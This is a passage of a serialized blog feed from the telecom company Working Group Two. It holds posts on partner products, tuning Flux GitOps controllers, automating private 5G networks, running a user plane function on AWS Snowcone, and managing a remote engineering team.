catalogue?](mailto:waldum@wgtwo.com)\\n\\n### **Voxist - virtual personal assistant**\\n\\nThe idea of the team behind\xa0[Voxist](https://www.voxist.com/)\xa0is to create a\xa0**virtual personal assistant**\xa0that replaces old voicemail systems. People calling get personalized greetings, and a message can be transcribed and sent as a text message. A Voxist user can access voicemail messages through the web or app interface - or via email when away from the phone. Find it on WG2\'s platform.\xa0\\n\\n[![Voxist builds a personalized voice assistant, on WG2\'s platform.](./voxist-image.png)](https://www.voxist.com/)\\n\\n### **Vxt - smart voicemail**\\n\\nThe passionate\xa0[Vxt](https://www.vxt.co.nz/)\xa0team is on a mission to leverage communications data to automate the most boring work in the world, namely administrative tasks. They\u2019ve made\xa0**voicemail**\xa0both simpler and smarter by offering instant transcriptions, smart greetings, email integration, and the ability to access your messages from anywhere.\\n\\n[![Vxt voicemail is on WG2\'s platform](./vxt-image.png)](https://www.vxt.co.nz/)\\n\\n### **Truecaller**\\n\\n[Truecaller](https://www.truecaller.com/)\xa0is already trusted by over 338 million people, Truecaller is proud to be a leader in caller ID and spam blocking software as well as research around call and SMS harassment. More details to come about Truecaller on the WG2 platform.\xa0\\n\\n[![Truecaller](./truecaller.png)](https://www.truecaller.com/)\\n\\n### **Product distribution opportunity**\xa0\\n\\nOne of our operator customers, with multi-country ambitions, is looking for products to differentiate and drive new revenue streams. Here are the product categories they specifically look for:  \\n  \\n- \ud83d\udd12\xa0**Online content filtering:**\xa0Help people avoid harm and danger while surfing, by blocking certain online content.  \\n- \ud83d\udccd\xa0**Location tracking:**\xa0Help people know where their loved ones are without depending on battery draining apps who sell their data to advertisers.  \\n- \ud83d\udc6e\ud83c\udffe\xa0**Individual Network Management:**\xa0Give people a more private, quick, secure, and stable internet experience by letting them set their own VPN, Static IP, and DNS.  \\n- \ud83d\udcea\xa0**SMS in messaging apps:**\xa0Let people use their favorite messaging app for all texting by getting SMSes in there too.  \\n  \\nPop an email to\xa0[Tim Hearon](mailto:tim.hearon@wgtwo.com)\xa0here at WG2 if you\'re a developer and want to pitch your product.\\n\\n### **Bonus actions**\\n\\n- **Building a product ecosystem:**\xa0[Here\'s a question mobile operators need to hear more often](https://www.wgtwo.com/blog/nortel-ecosystem/).\xa0\\n- **Creating products for telcos?**\xa0Connect with us on our\xa0[public Slack workspace](https://developer.wgtwo.com/join-us-on-slack)\xa0to learn about getting your products on our platform.\xa0\\n- **Apply for a job.**\xa0We\u2019re looking for people in\xa0[all kinds of roles](https://www.wgtwo.com/careers/).\\n\\n-----------"},{"id":"tuning-flux","metadata":{"permalink":"/blog/tuning-flux","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2023-04-05-tuning-flux/index.md","source":"@site/../blog/2023-04-05-tuning-flux/index.md","title":"Tuning flux","description":"Last year we upgraded from flux v1 to v2, flux v2 being a full rewrite, splitting the single binary into a number of dedicated controllers to improve performance. We installed flux v2 to each of our clusters, and let it run for a while before revisiting it to see what needed tuning, and what improvements could be made.","date":"2023-04-05T00:00:00.000Z","formattedDate":"April 5, 2023","tags":[{"label":"infrastructure","permalink":"/blog/tags/infrastructure"},{"label":"automation","permalink":"/blog/tags/automation"},{"label":"gitops","permalink":"/blog/tags/gitops"}],"readingTime":2.58,"hasTruncateMarker":true,"authors":[{"name":"Anna Kennedy","title":"Tech Lead for Cloud and Edge Infrastructure","url":"https://www.linkedin.com/in/annaken","imageURL":"/img/author-photos/ak.jpg","key":"anna-kennedy"}],"frontMatter":{"slug":"tuning-flux","title":"Tuning flux","date":"2023-04-05T00:00:00.000Z","tags":["infrastructure","automation","gitops"],"authors":["anna-kennedy"],"image":"./flux-flow-3.png"},"prevItem":{"title":"Meet the trailblazing product developers that help mobile operators differentiate and innovate - on WG2\'s platform","permalink":"/blog/trailblazing-product-devs"},"nextItem":{"title":"Using automation to drive down complexity and increase scalability of private networks","permalink":"/blog/automating-private-networks"}},"content":"import ImgWithCaption from \'../components/imgWithCaption\'\\n\\nLast year we upgraded from flux v1 to v2, flux v2 being a full rewrite, splitting the single binary into a number of dedicated controllers to improve performance. We installed flux v2 to each of our clusters, and let it run for a while before revisiting it to see what needed tuning, and what improvements could be made.\\n\\n\x3c!--truncate--\x3e\\n\\n## Controller behaviour and intervals\\n\\nAs we dug down into the documentation, we realised that our mental model of how the controllers worked wasn\'t the whole picture. We\'d been thinking about the four main controllers (image-reflector, image-automation, source and kustomize) as four totally separate entities, and accordingly set their \\"doing-stuff\\" intervals very low (typically ~1 min) thinking that that would mean changes were deployed quickly.\\n\\n<ImgWithCaption\\n  caption=\\"Incorrect model - no communication between controllers\\"\\n  src={require(\\"!file-loader!./flux-flow-1.png\\").default}\\n  />\\n\\nAs it turns out, there is a lot of interaction between the controllers, and the discovery of a new image or a new git commit initates a workflow that ends up in a kustomize controller reconciliation:\\n\\n* The image-reflector controller polls the registry for new images every minute, but upon discovery of a new image it notifies the  image-automation controller to write the new image tag to git.\\n* The source controller polls github for new commits, but when a new commit is discovered the it notifies the kustomize controller to start a new reconciliation.\\n\\n<ImgWithCaption\\n  caption=\\"Correct model - communication between controllers\\"\\n  src={require(\\"!file-loader!./flux-flow-2.png\\").default}\\n  />\\n\\nTo improve performance further, we added a webhook so that a new commit to github would be pushed to the source controller.\\n\\n<ImgWithCaption\\n  caption=\\"Improved model - webhook initiates reconciliation\\"\\n  src={require(\\"!file-loader!./flux-flow-3.png\\").default}\\n  />\\n\\nNow we only need the image-reflector controller to poll the registry every minute; the other three controllers are event-driven, not interval driven.\\n\\nThis meant we could increase the interval timings to around an hour, and this would be primarily as a backstop (in case something broke) and to revert any manual changes made to the cluster.\\n\\nSetting high intervals meant that the controllers were only invoked when there was action for them to take, and as a result ran much faster when a new image or commit arrived, instead of spinning constantly.\\n\\n## Limit yaml parsing\\n\\nThe other major improvement we made was to limit how much yaml needed to be parsed for each cluster. We have essentially a kubernetes monorepo, with config for all clusters laid out like\\n```\\nmonorepo\\n\\t- library\\n\\t- cluster1\\n\\t- cluster2\\n\\t- cluster3\\n```\\nThere\'s no point parsing the yaml for cluster 2 when we\'re reconciling cluster 1, so we limit this in the source resource like:\\n```\\n---\\napiVersion: source.toolkit.fluxcd.io/v1beta2\\nkind: GitRepository\\nmetadata:\\n\xa0\xa0name: kubeconf\\n\xa0\xa0namespace: flux-system\\nspec:\\n\xa0\xa0ignore: |\\n\xa0\xa0\xa0\xa0/*\\n\xa0\xa0\xa0\xa0!/cluster1\\n\xa0\xa0\xa0\xa0!/library\\n```\\nThat is, ignore all yaml except what is directly applicable to this cluster.\\n\\n## Performance improvements\\n\\nThe net result of these changes was that we went from an average of 10-20 minutes from a new image arriving in the registry to being deployed, down to 1-2 minutes.\\n\\nNote: we used https://fluxcd.io/flux/guides/monitoring/#flux-dashboards for excellent insights into how flux wass performing in the clusters."},{"id":"automating-private-networks","metadata":{"permalink":"/blog/automating-private-networks","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2023-03-30-automatingprivatenetworks/index.md","source":"@site/../blog/2023-03-30-automatingprivatenetworks/index.md","title":"Using automation to drive down complexity and increase scalability of private networks","description":"Recently, as any other engineer on the planet, I asked ChatGPT what is needed to build a private 5G network. Here\u2019s what it said.","date":"2023-03-30T00:00:00.000Z","formattedDate":"March 30, 2023","tags":[{"label":"privatenetworks","permalink":"/blog/tags/privatenetworks"},{"label":"aws","permalink":"/blog/tags/aws"},{"label":"automation","permalink":"/blog/tags/automation"},{"label":"saas","permalink":"/blog/tags/saas"}],"readingTime":4.97,"hasTruncateMarker":true,"authors":[{"name":"Yan Grunenberger","title":"Software Engineer for Session Management & Protocol Termination","url":"https://www.linkedin.com/in/yangrunenberger/","imageURL":"/img/author-photos/yg.jpg","key":"yan"}],"frontMatter":{"slug":"automating-private-networks","title":"Using automation to drive down complexity and increase scalability of private networks","date":"2023-03-30T00:00:00.000Z","tags":["privatenetworks","aws","automation","saas"],"authors":["yan"],"image":"./yan2.png"},"prevItem":{"title":"Tuning flux","permalink":"/blog/tuning-flux"},"nextItem":{"title":"How Working Group Two Accelerates the Creation of Mobile Networks with AWS Snow Family","permalink":"/blog/how-working-group-two-accelerates-the-creation-of-mobile-networks-with-aws-snow-family"}},"content":"import ImgWithCaption from \'../components/imgWithCaption\'\\n\\nRecently, as any other engineer on the planet, I asked ChatGPT what is needed to build a private 5G network. Here\u2019s what it said. \\n\\n\x3c!--truncate--\x3e\\n\\n<ImgWithCaption\\n  style={{\\n    width: \\"100%\\",\\n  }}\\n  caption=\\"Talking to AI\\"\\n  src={require(\\"!file-loader!./chatgpt.png\\").default}\\n  />\\n  \\nChatGPT\u2019s AI-generated response is not far from our vision. At WG2, we\u2019re offering a rebuilt, modern core network delivered as a hosted service. It drives the dual benefits of cost savings and revenue growth for our private network customers.  \\n\\nCase in point: Recently, [we teamed up with Kyocera Mirai Envison](https://www.wgtwo.com/blog/kcme-teams-up-with-wg2-for-private-networks/) to deliver private networks in Japan, and we\u2019re now deploying our first solution in the agricultural sector.   \\n\\n**In this post, we\u2019ll explore how it would be possible to rationalize costs and reduce the time to onboard a new customer.**\\n\\n## What you need\\n\\nTo build a private network yourself, you essentially need: \\n* Cellular-related spectrum. You either need a faraday cage or live in a country that allows some cellular-allocated spectrum to be used (i.e. USA with CBRS, Japan with sXGP, Norway with a license, Germany/Spain with a license from the local regulator - the list is growing every day).\\n* RAN equipment - this could be as small as a wifi-sized eNodeB from some vendors to actual macro-like equipment. This equipment will need to be installed. This is the only network hardware you will need, and eventually some compute capabilities if your connectivity needs it (like fast 5G speed are important).\\n* IP addresses - bring your own RFC 1918 addresses, like ChatGPT is recommending. \\n* SIM cards and some phones (that\u2019s probably what ChatGPT refers to as networking equipment). \\n* Network protocols: here, ChatGPT is modest, but you probably want to support protocols: \\n> * Some IPSec to connect and secure your RAN equipment back to the core network by protecting the network traffic\\n> * Some SCTP traffic to actually enable your RAN equipment to communicate with the core \\n> * Some GTP traffic to actually transport your Internet traffic from and to your RAN equipment. \\n* Network hardware and software, and some configuration and administration: this is where WG2 is focusing these days to bring value.  [After testing out](https://www.wgtwo.com/blog/exploring-aws-snowcone/) AWS\u2019s fantastic, little on-premises hardware, the AWS Snowcone, we wanted to enable our customers to enjoy a nearly zero-touch network hardware and software experience.\\n\\n\\nBy analyzing the requirements of a few variants of network RAN equipment, in our lab experience we came up with the following:\\n* Each private network customer might bring their own IP / network CIDR requirement\\n* Each network needs a public endpoint to connect back to our Core \\n* Each network needs some security and configuration knob to be adjusted (i.e. Network identifier or PLMN, Tracking area covered, slice (in case of 5G). \\n\\nEventually, the customer can opt for a packet gateway in the cloud (ideal for voice services) or on premises (ideal for high speed 5G data)\\n\\nIn order to rationalize costs and reduce the time to onboard each customer, we decided to work on automating those minimal deployments, using automation on our clusters running in AWS. This way, our customers will be able to discover our technology at a lower cost and eventually, all by themselves. \\n\\n## The approach\\n\\nThe actual approach is the following:\\n* A manifest for a private network is created - it contains mostly the parameters needed for the network to operate. We focus mostly on the one that the customer will be requesting - i.e. network details (CIDR), network PLMN, tac, etc. These manifests can be created via various means, but a web page and a form can be used. \\n* The automation generates the following elements from the manifest:\\n* A public endpoint (set of IP addresses) that the customer need to input as IPSec configuration \\n* A set of certificates to authenticate the IPSec link with our core \\n* A internal, customer specific, MME/AMF IP configuration (set of IP addresses)\\n* A set of VPN credentials and commands to onboard an edge based virtual machine or bare metal equipment. \\n\\n<ImgWithCaption\\n  style={{\\n  }}\\n  caption=\\"Architecture\\"\\n  src={require(\\"!file-loader!./architecture2.png\\").default}\\n  />\\n\\nAt the end of the automation, within seconds, we obtain those elements and we make them available to the customer. \\n\\n**As a result:**\\n* A set of configuration parameters automatically generated such as Certificate Authority, public and private key, as well as IP addresses parameters to enter in their equipment. We aim to automate this via protocols like TR.069 in the long run, but we found it convenient to enable a common set of technology (like IPSec + certificate) as a solid base to start with. Once introduced into RAN equipment, they are automatically connected on their private network overlay and can access our MME/AMF SCTP endpoint and start to attach their phones, and eventually pass their phone calls, once, of course, they have declared the SIM card of their phones/tablets in our system. \\n* Eventually, if they deploy an edge system and execute a simple set of commands, we can onboard their edge computer - such as AWS Snowcone! If they deploy a local version of our packet gateway, voila, their traffic will be automatically offloaded at the edge using the IP range they have provided us. It should be that easy.\\n* In the end, if they want to close the network, no problem. We\u2019ll remove the manifests from our system and the resources will get cleaned from our internal and AWS systems. \\n\\n**How realistic is this?**   \\nWe are not too far from this - this is the expected and targeted user experience. We plan to work on the user journey to facilitate the onboarding of different kinds of users, but the underlying technology that enables them to connect should be the same and is mostly working for some simple network use cases. We are currently looking at customer feedback and trials in their labs to constantly improve our automation and further reduce the cost of deploying and operating private networks."},{"id":"how-working-group-two-accelerates-the-creation-of-mobile-networks-with-aws-snow-family","metadata":{"permalink":"/blog/how-working-group-two-accelerates-the-creation-of-mobile-networks-with-aws-snow-family","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2023-03-27-how-working-group-two-accelerates-the-creation-of-mobile-networks-with-aws-snow-family/index.md","source":"@site/../blog/2023-03-27-how-working-group-two-accelerates-the-creation-of-mobile-networks-with-aws-snow-family/index.md","title":"How Working Group Two Accelerates the Creation of Mobile Networks with AWS Snow Family","description":"Many enterprises, telcos, and vendors mention that private and public 4G/5G can be confusing, hard-to-procure, and manage. In many cases, getting started requires a large capital outlay, which organizations may not want to commit to given their unfamiliarity with private cellular technology.","date":"2023-03-27T00:00:00.000Z","formattedDate":"March 27, 2023","tags":[{"label":"aws","permalink":"/blog/tags/aws"},{"label":"ec2","permalink":"/blog/tags/ec-2"},{"label":"snow family","permalink":"/blog/tags/snow-family"},{"label":"mobile networking","permalink":"/blog/tags/mobile-networking"}],"readingTime":7.755,"hasTruncateMarker":true,"authors":[{"name":"Holger Ihrig","title":"Software Engineer for Session Management & Protocol Termination","url":"https://www.linkedin.com/in/hihrig/","imageURL":"/img/author-photos/hi.jpg","key":"holger-ihrig"}],"frontMatter":{"slug":"how-working-group-two-accelerates-the-creation-of-mobile-networks-with-aws-snow-family","title":"How Working Group Two Accelerates the Creation of Mobile Networks with AWS Snow Family","date":"2023-03-27T00:00:00.000Z","tags":["aws","ec2","snow family","mobile networking"],"authors":["holger-ihrig"],"image":"./wgtwo-Mobile-Core-1.png"},"prevItem":{"title":"Using automation to drive down complexity and increase scalability of private networks","permalink":"/blog/automating-private-networks"},"nextItem":{"title":"Managing from the middle of nowhere","permalink":"/blog/managing-from-the-middle-of-nowhere"}},"content":"import ImgWithCaption from \'../components/imgWithCaption\'\\n\\nMany enterprises, telcos, and vendors mention that private and public 4G/5G can be confusing, hard-to-procure, and manage. In many cases, getting started requires a large capital outlay, which organizations may not want to commit to given their unfamiliarity with private cellular technology.\\n\\n\x3c!--truncate--\x3e\\n\\nIn this post, we will explore a\xa0[mobile core solution](https://www.wgtwo.com/)\xa0from Working Group Two (WG2) and how a customer can implement a mobile private network (MPN) leveraging all the benefits of an Amazon Web Services (AWS) hybrid cloud deployment.\\n\\n---\\n\\n<small>\\nWritten by:\\n<ul>\\n  <li>Holger Ihrig, Software Engineer \u2013 Working Group Two</li>\\n  <li>Adolfo Pica, Sr. Solutions Architect \u2013 AWS</li>\\n  <li>David Perez Caparros, Sr. Industry Specialist \u2013 AWS</li>\\n</ul>\\n</small>\\n\\n---\\n\\nThe WG2 platform offers the full capabilities of an MPN core for 4G/5G as-a-service, including authentication and provisioning, voice, data services and the surrounding orchestration, as well as the operational and management tools.\\n\\n[**Working Group Two**](https://www.wgtwo.com/)\xa0is an\xa0[AWS Partner](https://partners.amazonaws.com/partners/0010h00001ZY6fDAAT/Working%20Group%20Two%20As)\xa0building a future-proof technology that reduces cost and complexity while radically enhancing innovation potential in the telecom industry. To make this a reality, WG2 creates programmable mobile core networks as a platform with APIs, delivered as-a-service and running on world-class infrastructure from AWS.\\n\\nWorking Group Two exposes a marketplace where operators, developers, and end users can meet and interact. The WG2 core platform has multi-G support and offers the full set of capabilities related to authentication, provisioning, voice, messaging, and data services. Its core is live across Europe, United States, and Japan, serving public mobile networks, private networks, and Internet of Things (IoT) solutions.\\n\\n## Solution Overview\\n\\nThe figure below shows a simplified deployment model of a mobile private network using Working Group Two and an edge location.\\n\\n<ImgWithCaption\\n  caption=\\"Figure 1 \u2013 Working Group Two mobile core deployment on AWS.\\"\\n  src={require(\\"!file-loader!./wgtwo-Mobile-Core-1.png\\").default}\\n  />\\n\\nThe WG2 mobile core on AWS includes components such as the Home Subscriber Server (HSS), IP Multimedia Subsystem (IMS), Mobility Management Entity (MME), or Proxy Call Session Control Function (P-CSCF).\\n\\nThe HSS leverages\xa0[AWS Key Management Service](https://aws.amazon.com/kms/)\xa0(AWS KMS) to encrypt and decrypt subscriber information. The IMS and P-CSCF provide voice and multimedia services to mobile clients, while the MME is handling control plane traffic from the radio units.\\n\\nThe User Plane Function (UPF) in a mobile network is basically a router that also does encapsulation and de-encapsulation of the GPRS Tunneling Protocol (GTP). The UPF can be deployed in an AWS region or at an edge location, such as a customer data center. In the second case, the UPF is remotely controlled from the AWS region, either through\xa0[AWS Direct Connect](https://aws.amazon.com/directconnect/)\xa0or virtual private network (VPN) over the internet.\\n\\nWhile the control plane presents relatively low requirements in terms of latency, the user plane can benefit from an ultra-fast response at the edge (up to single-digit millisecond in the case of 5G user plane). Based on this, it\u2019s pertinent to host the telco control plane fully on an AWS region in order to profit from the scalability, flexibility, cost efficiency, and agility it provides.\\n\\nWorking Group Two has built its mobile core solution to run on multiple AWS regions, experiencing the benefits of cloud computing across the entire telco stack. Benefits include continuous roll-out and a container-first approach, all microservices-oriented with observability and efficiency in mind.\\n\\nOn the other hand, some Mobile Virtual Network Operators (MVNOs) lease wireless capacity from mobile network operators and resell it to consumers under their own brand. This means the mobile core network services need to run close to their underlying provider\u2019s Radio Access Network (RAN) infrastructure\u2014typically a Tier 1 service across various countries or via their roaming partners with a dense capillary network stretching from their RAN network up to specific Network Exchange Points (IXP).\\n\\nUsing cloud services like AWS Direct Connect, IXPs can connect to the\xa0[AWS global network](https://aws.amazon.com/about-aws/global-infrastructure/global_network/). In this way, compute and networking devices (switch, routers, and virtualization-ready servers) placed close to IXPs enable the user plane to be as close as possible to the end users, while still enabling control plane components entirely running in the AWS region.\\n\\nIdentifying those data center facilities close to their connectivity partner, and interconnecting the control plane\u2014diameter, SIGTRAN, or SIP\u2014and the user plane (internet traffic or voice traffic under the form of RTP flows) to the infrastructure of said partner is a rather manual and tedious process.\\n\\nSuch a process involves:\\n\\n- Understanding the geography.\\n- Understanding the distribution of data centers and their capability towards AWS, where the WG2 mobile core is running.\\n- Understanding pricing, volumetry, and service-level agreements (SLAs) of each provider.\\n- Selecting one or several sites.\\n- Deploying and order hardware.\\n- Deploying WG2\u2019s software stack and connecting back to AWS.\\n- Configuring resources in AWS and in the WG2 edge compute environment to support that new interconnection.\\n\\nOnce the steps above have been completed, it\u2019s possible to rely on infrastructure as code (IaC) and automation to deploy and operate the software that handles the user plane and the control plane interconnection with AWS.\\n\\n## Simplify Edge Deployments with AWS Snow Family\\n\\nContrary to public mobile networks, private networks are dedicated to private customers, with specific components deployed on premises. Starting with the RAN equipment\u2014often made of small cells or smaller Macro RAN equipment known as access points\u2014provides 4G or 5G connectivity.\\n\\nTypically, the traffic flows from User Equipment (UE) or Customer-Premise Equipment (CPE) devices to either other on-premises devices, or it\u2019s offloaded to the internet or to AWS to be processed.\\n\\nThis market has been enabled by the development of spectrum-open policy such as CBRS (U.S.) or sXGP (Japan) and the emergence of alternate technologies like OpenRAN. For those customers, the very same control plane running on AWS can be used. Each customer may want to run their own user plane infrastructure on premises in order to minimize latency to the Internet.\\n\\nThis edge scenario becomes a challenge, in particular:\\n\\n- When it comes to identifying and validating edge hardware, this becomes difficult to procure. Also, it takes time to validate hardware, test the presence of characteristics, such as power and AC requirements and address the availability of specific network hardware to provide the best user experience.\\n- Supply chain management is a new challenge. Finding the right network adapters at a constant price can be challenging due to the fluctuation of hardware prices.\\n- Onboarding the hardware, managing out-of-band interfaces, and the virtualization stack require an operational effort.\\n\\nThe above-mentioned challenges can be overcome by using edge devices provided by the\xa0[AWS Snow Family](https://aws.amazon.com/snow/). WG2 decided to experiment in its own\xa0[on-premises lab](https://www.wgtwo.com/blog/exploring-aws-snowcone/), with the idea to enable customers to try private networks in a simple and easy way.\\n\\n[AWS Snowcone](https://aws.amazon.com/snowcone/)\xa0is a small form-factor server that was originally meant for data transport to an AWS region. It can also be used as a small device running compute workloads, and in that role it exposes two vCPU cores and four GB of memory. However, it also has the ability to forward the two 10 GbE NICs directly to those virtual machines. In addition to that, it comes with a ruggedized form factor that can be easily shipped to its destination.\\n\\n## User Plane Function on AWS Snowcone\\n\\nFor the UPF, it\u2019s essential the network path is as performant as possible.\\n\\nWorking Group Two uses Vector Packet Processing (VPP) to implement this UPF. The way this works is that VPP sets the NIC into poll mode, thus removing it from kernel-packet processing. The disadvantage here is, of course, that one CPU core is just busy polling the NIC.\\n\\nWorking Group Two set up a virtual machine with a Direct Attached Network Interface (DNI) and two CPU Cores. AWS Snowcone can attach such a DNI to its hosted\xa0[Amazon Elastic Compute Cloud](https://aws.amazon.com/ec2/)\xa0(Amazon EC2) instance. This makes AWS Snowcone a good candidate for a UPF that will almost saturate a 10 GbE link.\\n\\nUsing a UPF running on the AWS Snowcone device, the WG2 network achieved the following throughput using a single port.\\n\\n<ImgWithCaption\\n  caption=\\"Figure 2 \u2013 Throughput of WG2 UPF on AWS Snowcone.\\"\\n  src={require(\\"!file-loader!./wgtwo-Mobile-Core-2.png\\").default}\\n  />\\n\\nThe AWS Snowcone UPF is, in this case, just encapsulating GPRS Tunnel Protocol User (GTPU) packets, but nevertheless it\u2019s a nice throughput for a small private network deployment.\\n\\nThe setup provides the following advantages for customers:\\n\\n- A small ruggedized form-factor server can be shipped easily to a customer that wants to use an on-premise UPF.\\n- With AWS Snowcone, it\u2019s possible to start using it immediately. Working Group Two can configure the UPF and ship it to the customer after a basic networking check.\\n- The cost of the implementation is predictable. The threshold for driving an initial test is very low, due to the pay-as-you-go model by AWS.\\n\\nIn case of larger deployments, run multiple UPFs for load sharing, or with applications deployed at the edge, the AWS Snow Family offers multiple different options.\\n\\n## Conclusion\\n\\nThe telco world is embracing the benefits of the cloudified networks on AWS. Hybrid deployments can be simplified using tactical AWS edge devices to reduce the complexity of telco deployments.\\n\\nThe AWS Snowcone device has given Working Group Two the ability to quickly and easily create proof-of-concept integrations. Customers can try the WG2\xa0[private mobile network](https://www.wgtwo.com/)\xa0features and services and flexibly scale to larger and more capable devices in the AWS Snow Family.\\n\\n*Note:*\\n*This post originally appeared on the [AWS Partner Blog.](https://aws.amazon.com/blogs/apn/how-working-group-two-accelerates-the-creation-of-mobile-networks-with-aws-snow-family/)*"},{"id":"managing-from-the-middle-of-nowhere","metadata":{"permalink":"/blog/managing-from-the-middle-of-nowhere","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2023-03-02-managing-from-the-middle-of-nowhere/index.md","source":"@site/../blog/2023-03-02-managing-from-the-middle-of-nowhere/index.md","title":"Managing from the middle of nowhere","description":"Picture a secluded spot deep in a Norwegian fjord. As you wander past the main farmhouse, you come across a barn. Inside, there are no animals in sight. Instead of hay and manure, you\'re greeted by the aroma of freshly made hot chocolate. And there, sitting behind a computer, surrounded by screens and a lightning-fast internet connection, is Karl Johan Heimark.","date":"2023-03-02T00:00:00.000Z","formattedDate":"March 2, 2023","tags":[{"label":"wfh","permalink":"/blog/tags/wfh"},{"label":"management","permalink":"/blog/tags/management"},{"label":"people","permalink":"/blog/tags/people"},{"label":"vanvik","permalink":"/blog/tags/vanvik"}],"readingTime":3.36,"hasTruncateMarker":true,"authors":[{"name":"Karl Johan Sande Heimaark","title":"Engineering Manager","url":"https://www.linkedin.com/in/karljohanheimark/","imageURL":"/img/author-photos/kjh.jpeg","key":"kjh"}],"frontMatter":{"slug":"managing-from-the-middle-of-nowhere","title":"Managing from the middle of nowhere","date":"2023-03-02T00:00:00.000Z","tags":["wfh","management","people","vanvik"],"authors":["kjh"],"image":"./kjh-officeview2.png"},"prevItem":{"title":"How Working Group Two Accelerates the Creation of Mobile Networks with AWS Snow Family","permalink":"/blog/how-working-group-two-accelerates-the-creation-of-mobile-networks-with-aws-snow-family"},"nextItem":{"title":"Working Group Two announces strategic collaboration with Amazon Web Services","permalink":"/blog/wg2-teams-up-with-aws-strategic-partnership"}},"content":"import ImgWithCaption from \'../components/imgWithCaption\'\\n\\n![](./kjh-officeview.png)\\n\\nPicture a secluded spot deep in a Norwegian fjord. As you wander past the main farmhouse, you come across a barn. Inside, there are no animals in sight. Instead of hay and manure, you\'re greeted by the aroma of freshly made hot chocolate. And there, sitting behind a computer, surrounded by screens and a lightning-fast internet connection, is Karl Johan Heimark.\\n\\n\x3c!--truncate--\x3e\\n\\nKarl Johan is the Engineering Manager for a team of 17 talented software engineers scattered across Europe and Asia. Based in the little-known village of Vanvik, his unique workplace is a world away from the bustling tech hubs of Silicon Valley, London or even Oslo.\\n\\nHow does he manage a team of engineers from the middle of nowhere? \\n\\n**In his own words:**\\n\\n\u201cManagement and leadership are crucial in a distributed company, and it\'s easy to overlook their importance when things are running smoothly.\u201d\\n\\n\u201cLessons from Covid have shown that we were well-prepared as a distributed company from day one. We could continue to work much the same way as we already did. Covid didn\'t have a significant impact, but we did learn that doing social things, also in an online setting, is important to get people to know each other.\u201d\\n\\n<ImgWithCaption\\n  style={{\\n    width: \\"50%\\",\\n    float: \\"right\\",\\n    marginLeft:\\"20px\\"\\n  }}\\n  caption=\\"To Vanvik from space\\"\\n  src={require(\\"!file-loader!./earthtovanvik.gif\\").default}\\n  />\\n\\n\u201cThe pandemic has accelerated the shift towards remote work, and I believe that distributed companies will continue to thrive in the future.\u201d\\n\\n\u201cManaging teams from the middle of nowhere has been a learning experience. I\'ve found that trying to be close day-to-day by listening and following what\'s going on in Slack and standups is crucial.\u201d\\n\\n\u201cHaving regular one-on-ones with my team members every two weeks helps me stay on top of things. I spend half of Thursday and half of Tuesday on this. We use a single slide to guide us on gauging motivation levels, reviewing development goals and discussing things that are going well, and things that aren\'t going well. We put the slide on the screen, so both of us can see it and comment.\u201d\\n\\n<ImgWithCaption\\n  style={{\\n    width: \\"50%\\",\\n    float: \\"right\\",\\n    marginLeft:\\"20px\\"\\n  }}\\n  caption=\\"The four seasons of Vanvik\\"\\n  src={require(\\"!file-loader!./vanvik4seasons.png\\").default}\\n  />\\n\\n\u201cThe fact that every team, including the management, is distributed means that everyone is included. Nobody is left outside.\u201d\\n\\n\u201cAs a natural introvert, I\'ve become more comfortable with being an extrovert. I find both talking one on one and to a bigger group a lot easier over video than in person. When we have company settings and I meet everyone, it\'s not a big deal anymore.\u201d\\n\\n\u201cI can\u2019t follow the water cooler chat in the offices, so I\'m not necessarily colored by who talks the most in those settings. This makes me feel like I start meetings and one-on-ones with a cleaner sheet than I would in an office setting.\u201d\\n\\n\u201cI do miss the dopamine I used to get from coding when I could solve problems quickly. Management means that you think and work with a longer-term perspective. My job is to facilitate and try to make people productive, engaged and happy. I\u2019ve found that having a few old farm buildings to maintain makes for some great distracting physical work where I see the result quickly.\u201d\\n\\n<ImgWithCaption\\n  style={{\\n    width: \\"50%\\",\\n    float: \\"right\\",\\n    marginLeft:\\"20px\\"\\n  }}\\n  caption=\\"Cats living the good cat life\\"\\n  src={require(\\"!file-loader!./catsofvanvik.png\\").default}\\n  />\\n\\n\u201cLiving with only farmers as neighbors I\u2019ve gotten an immense amount of respect for the Norwegian farmer. I get very inspired by the work ethic, year-round planning and all-round skills that goes into keeping a farm running in the Norwegian fjords.\u201d\\n\\n\u201cMy location impacts me in a few ways. Being close to nature and being able to go for a hike summer or winter is a great way for me to recharge and clear my head. On the other hand, traveling anywhere is at least a half-day effort. It\'s a balance, and I\'ve learned to appreciate the pros and cons of my location.\u201d\\n\\n<ImgWithCaption\\n  style={{\\n    width: \\"50%\\",\\n    float: \\"middle\\",\\n    marginLeft:\\"20px\\"\\n  }}\\n  caption=\\"Cows are friendly, too!\\"\\n  src={require(\\"!file-loader!./cows.gif\\").default}\\n  />"},{"id":"wg2-teams-up-with-aws-strategic-partnership","metadata":{"permalink":"/blog/wg2-teams-up-with-aws-strategic-partnership","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2023-02-15-aws-sca-announcement/index.md","source":"@site/../blog/2023-02-15-aws-sca-announcement/index.md","title":"Working Group Two announces strategic collaboration with Amazon Web Services","description":"* Working Group Two and AWS collaborate to help telecom customers deploy mobile core in the cloud","date":"2023-02-15T00:00:00.000Z","formattedDate":"February 15, 2023","tags":[{"label":"saas","permalink":"/blog/tags/saas"},{"label":"operators","permalink":"/blog/tags/operators"},{"label":"core","permalink":"/blog/tags/core"},{"label":"cloud","permalink":"/blog/tags/cloud"},{"label":"partners","permalink":"/blog/tags/partners"},{"label":"aws","permalink":"/blog/tags/aws"},{"label":"press release","permalink":"/blog/tags/press-release"}],"readingTime":3.785,"hasTruncateMarker":true,"authors":[{"name":"Everyone @ wgtwo","title":"\ud83c\udf55","url":"https://www.wgtwo.com","imageURL":"/img/author-photos/wgtwo.png","key":"wgtwo"}],"frontMatter":{"slug":"wg2-teams-up-with-aws-strategic-partnership","title":"Working Group Two announces strategic collaboration with Amazon Web Services","date":"2023-02-15T00:00:00.000Z","tags":["saas","operators","core","cloud","partners","aws","press release"],"authors":["wgtwo"]},"prevItem":{"title":"Managing from the middle of nowhere","permalink":"/blog/managing-from-the-middle-of-nowhere"},"nextItem":{"title":"We\'re teaming up with Kyocera Mirai Envision to build private networks in Japan","permalink":"/blog/kcme-teams-up-with-wg2-for-private-networks"}},"content":"import ImgWithCaption from 